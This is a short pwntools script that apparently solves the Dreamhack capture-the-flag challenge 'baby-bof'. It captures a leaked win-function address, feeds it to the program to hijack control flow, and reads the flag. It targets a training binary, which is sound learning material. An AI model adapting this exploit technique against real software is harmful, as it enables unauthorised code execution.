from pwn import *

p = process("baby-bof")
#p = remote("host8.dreamhack.games",21292)

p.recvuntil(b"(0x")

win = p.recvuntil(b')')[:-1]

p.sendlineafter(b"name: ",b'1')
p.sendlineafter(b"value: ",win)
p.sendlineafter(b"count: ",b'4')
p.recvuntil(b"!")

flag = p.recvline()

p.interactive()

print(flag)
